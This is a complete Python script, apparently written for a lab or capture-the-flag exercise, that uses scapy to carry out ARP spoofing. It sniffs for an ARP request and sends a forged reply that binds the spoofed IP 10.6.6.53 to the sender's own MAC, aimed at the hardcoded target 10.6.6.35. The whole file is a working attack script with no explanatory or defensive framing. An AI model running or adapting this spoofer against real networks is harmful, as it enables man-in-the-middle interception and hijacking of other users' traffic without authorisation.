#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Intercepting this ARP request
# 12:28:55.407587 4c:24:57:ab:ed:84 > ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 42: Request who-has 10.6.6.53 tell 10.6.6.35, length 28

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
targetip="10.6.6.35"
targetmac="4c:24:57:ab:ed:84"
spoofip="10.6.6.53"

def handle_arp_packets(packet):
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst=targetmac, type=0x806, src=macaddr)

        arp_response = ARP(pdst=targetip)
        arp_response.op = 2
        #arp_response.plen = 99999
        #arp_response.hwlen = 99999
        #arp_response.ptype = 99999
        #arp_response.hwtype = 99999

        arp_response.hwsrc = macaddr
        arp_response.psrc = spoofip
        arp_response.hwdst = targetmac
        arp_response.pdst = targetip

        response = ether_resp/arp_response

        sendp(response, iface="eth0")

def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()
